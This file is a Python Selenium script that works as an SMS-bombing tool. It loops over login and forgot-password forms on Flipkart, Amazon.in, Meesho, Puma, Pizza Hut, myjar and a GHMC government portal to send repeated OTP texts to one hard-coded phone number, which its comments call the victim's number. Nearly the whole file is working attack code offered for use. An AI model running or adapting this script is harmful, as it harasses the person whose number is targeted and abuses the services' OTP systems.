from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Create an instance of Chrome webdriver
browser = webdriver.Chrome()

# Set the frequency of SMS, approximately 10 per 24 days
frequency = 2

# Target mobile number, change it to victim's number and
# ensure that it's registered on Flipkart
mobile_number = "9942844215"

# Initialize WebDriverWait with a timeout of 10 seconds
wait = WebDriverWait(browser, 10)

for i in range(frequency):
    browser.get('https://www.flipkart.com/account/login?ret=%2Faccount%2F%3Frd%3D0%26link%3Dhome_account')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[3]/button')))

    # Click on the "Forgot?" link
    forgot.click()
   
# Send SMS multiple times



    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()

browser = webdriver.Chrome()

frequency = 5

mobile_number = "9942844215"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://www.amazon.in/ap/forgotpassword?openid.pape.max_auth_age=900&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="ap_email"]')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="continue"]')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS 
    time.sleep(2)

# Close the browser
browser.quit()


# meesho

browser = webdriver.Chrome()

frequency = 10

mobile_number = "9942844215"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://www.meesho.com/auth?redirect=https%3A%2F%2Fwww.meesho.com%2F&source=profile&entry=header&screen=HP')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='/html/body/div/div[4]/div/div[2]/div/div/div[2]/input')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div[4]/div/div[2]/div/button/div')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()


#puma

browser = webdriver.Chrome()

frequency = 3

mobile_number = "9942844215"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://in.puma.com/in/en/account/login?action=login&gclid=Cj0KCQjwk96lBhDHARIsAEKO4xZwHUtvX1RdBaAOszK2jw13zZRIjfBK5hTFjyOMoLugsw5Jrm7R8VYaAufjEALw_wcB&utm_aud=OTH&utm_campaign=BS_GGL_IN_BS_GGL_SEA_TXT_Brand-Exact_agency_1000067495857508873&utm_medium=BS&utm_obj=OLC&utm_source=GGL-SEA')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="phoneNo"]')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="login-submit"]')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()



## Boat


# pizzahut

browser = webdriver.Chrome()

frequency = 10

mobile_number = "9942844215"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://www.pizzahut.co.in/account/otp')

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="phone-field"]')

    # Automatically type the target number
    number.send_keys(mobile_number)

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[2]/div/form/button')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(2)

# Close the browser
browser.quit()


#new1
browser = webdriver.Chrome()

frequency = 1

mobile_number = "9942844215"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://www.myjar.app/savings/buy-gold')

    select = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[1]/div/nav/div/span/div/button')))
    select.click()
    time.sleep(2)

    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="phoneNumber"]')

    # Automatically type the target number
    number.send_keys(mobile_number)

    select = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="tandc"]')))
    select.click()

    # Find the element to send a forgot password request using an alternative XPath expression
    forgot = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[3]/div/div[2]/div/div[2]/div/div/form/div[3]/button')))

    # Click on the "Forgot?" link
    forgot.click()

    # Set the interval to send each SMS
    time.sleep(31)

    for _ in range(10):
           select = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[3]/div/div[2]/div/div[2]/div/div/div/div[2]/button[2]/p/span')))
           select.click()
           time.sleep(31)

# Close the browser
browser.quit()


browser = webdriver.Chrome()

frequency = 40

mobile_number = "9942844215"

wait = WebDriverWait(browser, 10)
for i in range(frequency):
    browser.get('https://igs.ghmc.gov.in/send_otp_mobile.aspx')

    
    # Find the element to enter the number using the class name
    number = browser.find_element(by='xpath', value='//*[@id="txtmobileno"]')

    # Automatically type the target number
    number.send_keys(mobile_number)

    select = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="btnsendOTP"]')))
    select.click()

    time.sleep(5)

   

# Close the browser
browser.quit()







# browser = webdriver.Chrome()

# frequency = 10

# mobile_number = "9942844215"

# wait = WebDriverWait(browser, 10)
# for i in range(frequency):
#     browser.get('https://www.boat-lifestyle.com/account/login')

#     # Find the element to enter the number using the class name
#     number = browser.find_element(by='xpath', value='//*[@id="otp-mobile-number"]')

#     # Automatically type the target number
#     number.send_keys(mobile_number)

#     # Find the element to send a forgot password request using an alternative XPath expression
#     forgot = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[4]/div[1]/section/div/div/div[1]/div[2]/div[2]/div[4]/button[1]')))

#     # Click on the "Forgot?" link
#     forgot.click()

#     # Set the interval to send each SMS
#     time.sleep(2)

# # Close the browser
# browser.quit()
